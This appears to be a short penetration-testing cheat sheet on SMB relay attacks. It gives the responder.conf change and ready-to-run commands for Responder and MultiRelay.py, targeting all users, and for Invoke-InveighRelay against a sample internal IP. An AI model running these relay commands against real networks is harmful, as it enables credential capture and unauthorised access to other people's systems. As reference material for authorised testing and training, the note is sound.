# SMB Relay

### MultiRelay.py

For SMB Relay to be possible, you must turn off SMB and HTTP within the responder config file (you can change it back when you have finished)

Set responder.conf to:

![](<../../.gitbook/assets/image (5) (1).png>)

Then run responder:

```
sudo python3.9 /usr/share/responder/Responder.py -I eth0 -w -f -v
```

Then run the following in another terminal session

```
sudo python3.9 /usr/share/responder/tools/MultiRelay.py -t <target_IP> -u ALL
```

### Inveigh Relay

Session attack requires SMB tools from Invoke-TheHash

{% embed url="https://github.com/Kevin-Robertson/Invoke-TheHash" %}

```
Invoke-InveighRelay -ConsoleOutput Y -Target 10.0.2.110 -Command "...."
```
